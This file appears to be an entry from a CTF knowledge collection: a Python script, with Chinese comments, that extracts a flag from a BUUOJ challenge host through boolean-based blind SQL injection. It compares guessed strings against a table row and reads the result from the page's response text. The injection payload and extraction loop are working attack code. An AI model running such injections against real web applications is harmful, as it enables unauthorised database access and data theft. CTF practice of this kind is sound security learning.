# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/SQL.md
# TITLE: SQL
# CATEGORY: web

import requests

url='http://e0e4d9bf-1f0b-435c-aedf-6d1aa33856ce.node4.buuoj.cn:81/'
flag=''
for i in range(1,50):
    for j in range(32,128):
        hexchar=flag+chr(j)
        # f1ag_1s_h3r3_hhhhh这个表应该只有一个数据，所以id为1，我们用select 1,xx就可以进行第二个字段的比较了
        # 这个payload的意思就是f1ag_1s_h3r3_hhhhh第二个字段的数据每一个字符与这个字符串每隔一个字符一一比较大小，如果这个字符比较大，就返回True。以此类推，不断增加字符串长度，就可以得到完整的数据。
        payload = '2||((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))'.format(hexchar)
        #print(payload)
        data={'id':payload}
        re=requests.post(url=url,data=data)
        if 'Nu1L' in re.text:
            flag+=chr(j-1)
            print(flag)
            break
